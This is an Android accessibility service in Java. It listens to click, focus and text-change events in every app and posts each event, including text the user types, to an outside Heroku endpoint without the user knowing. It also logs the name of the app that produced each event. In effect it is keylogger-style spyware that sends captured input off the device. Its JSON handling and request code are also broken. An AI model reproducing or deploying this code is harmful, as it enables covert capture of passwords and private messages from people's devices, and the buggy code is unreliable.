package com.example.test_test;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.StreamCorruptedException;
import java.util.HashMap;
import java.util.Map;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "MyAccessibilityService";
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Log.e(TAG, "UtsustestonAccessibilityEvent: ");
        Log.e(TAG, "TOEXTRACT:"+event);

        String t = event.toString();






    String url = "https://accessibilitylistner.herokuapp.com/api";
        RequestQueue queue = Volley.newRequestQueue(MyAccessibilityService.this);
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest
                (Request.Method.POST,
                        url,
                        null,
                        new Response.Listener<JSONObject>() {
            @Override
            public void onResponse(JSONObject response) {
                Log.e(TAG,"suc");
                Log.e(TAG,"nope"+response);

            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Log.e(TAG,"nope"+error);

            }
        }){
            @Override
            protected Map<String,String> getParams() {
                Map<String, String> params = new HashMap<String, String>();

                String c = null;
                c = event.toString();

                JSONObject d = null;
                try {
                    d = new JSONObject(c);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                Log.e(TAG, "" + c);
                final String evt = params.put("evt", d.toString());


                return params;
            }

            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String,String> params = new HashMap<String, String>();
                params.put("Content-Type", "application/json");
                return params;
            }
        };
        queue.add(jsonObjectRequest);

        String packageName = event.getPackageName().toString();
        PackageManager packageManager = this.getPackageManager();

        try {
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
            CharSequence testlabel = packageManager.getApplicationLabel(applicationInfo);
            Log.e(TAG, "app name is: "+testlabel );


        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "On interrupt: something went wrong");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();


        AccessibilityServiceInfo  info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED |
                AccessibilityEvent.TYPE_VIEW_FOCUSED | AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;





        // Set the type of feedback your service will provide.

        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;


        info.notificationTimeout = 100;

        this.setServiceInfo(info);


        Log.e(TAG,"UtsustestOnserverConnected: ");
    }
}
